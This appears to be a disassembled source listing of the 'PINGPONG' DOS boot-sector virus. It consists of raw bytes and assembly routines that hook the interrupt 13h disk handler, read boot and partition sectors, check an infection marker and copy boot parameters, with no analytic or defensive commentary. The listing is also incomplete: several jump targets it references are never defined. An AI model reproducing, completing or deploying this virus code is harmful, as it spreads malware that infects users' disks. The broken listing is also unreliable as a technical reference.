PAGE 60,132
  
;��������������������������������������������������������������������������
;��                                      ��
;��                 PINGPONG                     ��
;��                                      ��
;��      Created:   17-Jul-91                            ��
;��                                      ��
;��������������������������������������������������������������������������
  
.286c
  
data_1e     equ 7C18h               ; (0000:7C18=5110h)
data_2e     equ 7C1Ah               ; (0000:7C1A=36FFh)
data_3e     equ 7C1Ch               ; (0000:7C1C=607h)
data_4e     equ 7C0Dh               ; (66F7:7C0D=89h)
data_5e     equ 7C0Eh               ; (66F7:7C0E=0EE46h)
data_6e     equ 7C13h               ; (66F7:7C13=5048h)
data_7e     equ 7DF3h               ; (66F7:7DF3=76FFh)
data_8e     equ 7DF5h               ; (66F7:7DF5=0E06h)
data_9e     equ 7DF7h               ; (66F7:7DF7=0E8h)
data_10e    equ 7DF8h               ; (66F7:7DF8=5Eh)
data_11e    equ 7EB0h               ; (66F7:7EB0=326h)
data_12e    equ 7EB2h               ; (66F7:7EB2=47h)
data_13e    equ 800Bh               ; (66F7:800B=9)
data_14e    equ 800Dh               ; (66F7:800D=0Bh)
data_15e    equ 800Eh               ; (66F7:800E=0B00h)
data_16e    equ 8010h               ; (66F7:8010=0)
data_17e    equ 8011h               ; (66F7:8011=0Bh)
data_18e    equ 8016h               ; (66F7:8016=0B00h)
data_19e    equ 81F5h               ; (66F7:81F5=9A50h)
data_20e    equ 81F9h               ; (66F7:81F9=724Ah)
data_21e    equ 81FBh               ; (66F7:81FB=8Bh)
data_22e    equ 81FCh               ; (66F7:81FC=0C4E5h)
  
codeseg     segment
        assume  cs:codeseg, ds:codeseg
  
  
        org 100h
  
pingpong    proc    far
  
start:
        jmp short loc_12
        db  90h
        db  'MSDOS3.2'
        db  0, 2, 2, 1, 0, 2
        db  70h, 0, 0D0h, 2, 0FDh, 2
        db  0, 9, 0, 2, 0, 0
        db  0, 33h, 0C0h, 8Eh, 0D0h, 0BCh
        db  0, 7Ch, 8Eh, 0D8h, 0A1h, 13h
        db  4, 2Dh, 2, 0, 0A3h, 13h
        db  4, 0B1h, 6, 0D3h, 0E0h, 2Dh
        db  0C0h, 7, 8Eh, 0C0h, 0BEh, 0
        db  7Ch, 8Bh, 0FEh, 0B9h, 0, 1
        db  0F3h, 0A5h, 8Eh, 0C8h, 0Eh, 1Fh
        db  0E8h, 0, 0, 32h, 0E4h, 0CDh
        db  13h, 80h, 26h, 0F8h, 7Dh, 80h
        db  8Bh, 1Eh, 0F9h, 7Dh, 0Eh, 58h
        db  2Dh, 20h, 0, 8Eh, 0C0h, 0E8h
        db  3Ch, 0, 8Bh, 1Eh, 0F9h, 7Dh
        db  43h, 0B8h, 0C0h, 0FFh, 8Eh, 0C0h
        db  0E8h, 2Fh, 0, 33h, 0C0h, 0A2h
        db  0F7h, 7Dh, 8Eh, 0D8h, 0A1h, 4Ch
        db  0, 8Bh, 1Eh, 4Eh, 0, 0C7h
        db  6, 4Ch, 0, 0D0h, 7Ch, 8Ch
        db  0Eh, 4Eh, 0, 0Eh, 1Fh, 0A3h
        db  2Ah, 7Dh, 89h, 1Eh, 2Ch, 7Dh
        db  8Ah, 16h, 0F8h, 7Dh, 0EAh, 0
        db  7Ch, 0, 0, 0B8h, 1, 3
        db  0EBh, 3, 0B8h, 1, 2, 93h
        db  3, 6, 1Ch, 7Ch, 33h, 0D2h
        db  0F7h, 36h, 18h, 7Ch, 0FEh, 0C2h
        db  8Ah, 0EAh, 33h, 0D2h, 0F7h, 36h
        db  1Ah, 7Ch, 0B1h, 6, 0D2h, 0E4h
        db  0Ah, 0E5h, 8Bh, 0C8h, 86h, 0E9h
        db  8Ah, 0F2h, 8Bh, 0C3h
  
pingpong    endp
  
;��������������������������������������������������������������������������
;                  SUBROUTINE
;��������������������������������������������������������������������������
  
sub_1       proc    near
        mov dl,ds:data_10e          ; (66F7:7DF8=5Eh)
        mov bx,8000h
        int 13h             ; Disk  dl=drive �: ah=func 02h
                            ;  read sectors to memory es:bx
        jnc loc_ret_1           ; Jump if carry=0
        pop ax
  
loc_ret_1:
        ret
sub_1       endp
  
        db  1Eh, 6, 50h, 53h, 51h, 52h
        db  0Eh, 1Fh, 0Eh, 7, 0F6h, 6
        db  0F7h, 7Dh, 1, 75h, 42h, 80h
        db  0FCh, 2, 75h, 3Dh, 38h, 16h
        db  0F8h, 7Dh, 88h, 16h, 0F8h, 7Dh
        db  75h, 22h, 32h, 0E4h, 0CDh, 1Ah
        db  0F6h, 0C6h, 7Fh, 75h, 0Ah, 0F6h
        db  0C2h, 0F0h, 75h, 5, 52h, 0E8h
        db  0B1h, 1, 5Ah, 8Bh, 0CAh, 2Bh
        db  16h, 0B0h, 7Eh, 89h, 0Eh, 0B0h
        db  7Eh, 83h, 0EAh, 24h, 72h, 11h
        db  80h, 0Eh, 0F7h, 7Dh, 1, 56h
        db  57h, 0E8h, 12h, 0, 5Fh, 5Eh
        db  80h, 26h, 0F7h, 7Dh, 0FEh
loc_2:
        pop dx
        pop cx
        pop bx
        pop ax
        pop es
        pop ds
        jmp far ptr loc_11
  
;��������������������������������������������������������������������������
;                  SUBROUTINE
;��������������������������������������������������������������������������
  
sub_2       proc    near
        mov ax,201h
        mov dh,0
        mov cx,1
        call    sub_1
        test    byte ptr ds:data_10e,80h    ; (66F7:7DF8=5Eh)
        jz  loc_5               ; Jump if zero
        mov si,81BEh
        mov cx,4
  
locloop_3:
        cmp byte ptr [si+4],1
        je  loc_4               ; Jump if equal
        cmp byte ptr [si+4],4
        je  loc_4               ; Jump if equal
        add si,10h
        loop    locloop_3           ; Loop if cx > 0
  
        ret
loc_4:
        mov dx,[si]
        mov cx,[si+2]
        mov ax,201h
        call    sub_1
loc_5:
        mov si,8002h
        mov di,7C02h
        mov cx,1Ch
        rep movsb               ; Rep while cx>0 Mov [si] to es:[di]
        cmp word ptr ds:data_22e,1357h  ; (66F7:81FC=0C4E5h)
        jne loc_7               ; Jump if not equal
        cmp byte ptr ds:data_21e,0      ; (66F7:81FB=8Bh)
        jae loc_ret_6           ; Jump if above or =
        mov ax,ds:data_19e          ; (66F7:81F5=9A50h)
        mov ds:data_8e,ax           ; (66F7:7DF5=0E06h)
        mov si,ds:data_20e          ; (66F7:81F9=724Ah)
        jmp loc_10
  
loc_ret_6:
        ret
loc_7:
        cmp word ptr ds:data_13e,200h   ; (66F7:800B=9)
        jne loc_ret_6           ; Jump if not equal
        cmp byte ptr ds:data_14e,2      ; (66F7:800D=0Bh)
        jb  loc_ret_6           ; Jump if below
        mov cx,ds:data_15e          ; (66F7:800E=0B00h)
        mov al,ds:data_16e          ; (66F7:8010=0)
        cbw                 ; Convrt byte to word
        mul word ptr ds:data_18e        ; (66F7:8016=0B00h) ax = data * ax
        add cx,ax
        mov ax,20h
        mul word ptr ds:data_17e        ; (66F7:8011=0Bh) ax = data * ax
        add ax,1FFh
        mov bx,200h
        div bx              ; ax,dx rem=dx:ax/reg
        add cx,ax
        mov ds:data_8e,cx           ; (66F7:7DF5=0E06h)
        mov ax,ds:data_6e           ; (66F7:7C13=5048h)
        sub ax,ds:data_8e           ; (66F7:7DF5=0E06h)
        mov bl,ds:data_4e           ; (66F7:7C0D=89h)
        xor dx,dx               ; Zero register
        xor bh,bh               ; Zero register
        div bx              ; ax,dx rem=dx:ax/reg
        inc ax
        mov di,ax
        and byte ptr ds:data_9e,0FBh    ; (66F7:7DF7=0E8h)
        cmp ax,0FF0h
        jbe loc_8               ; Jump if below or =
        or  byte ptr ds:data_9e,4       ; (66F7:7DF7=0E8h)
loc_8:
        mov si,1
        mov bx,ds:data_5e           ; (66F7:7C0E=0EE46h)
        dec bx
        mov ds:data_7e,bx           ; (66F7:7DF3=76FFh)
        mov byte ptr ds:data_12e,0FEh   ; (66F7:7EB2=47h)
        jmp short loc_9
sub_2       endp
  
        db  2, 0, 0Ch, 0, 1, 0
        db  0CAh, 2, 0, 57h, 13h, 55h
        db  0AAh
  
codeseg     ends
  
  
  
        end start
